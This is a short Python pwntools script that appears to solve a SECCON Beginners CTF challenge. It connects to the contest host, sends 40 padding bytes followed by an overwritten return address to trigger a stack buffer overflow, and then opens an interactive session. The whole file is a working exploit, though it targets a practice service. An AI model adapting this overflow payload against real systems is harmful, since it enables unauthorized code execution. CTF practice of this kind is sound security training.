from pwn import *

# context.log_level = "DEBUG"

s = remote("bs.quals.beginners.seccon.jp", 9001)
s.sendlineafter(
    "Input: ",
    b"A" * 40 + b"\x62\x08\x40\x00\x00\x00\x00\x00",
)
s.interactive()
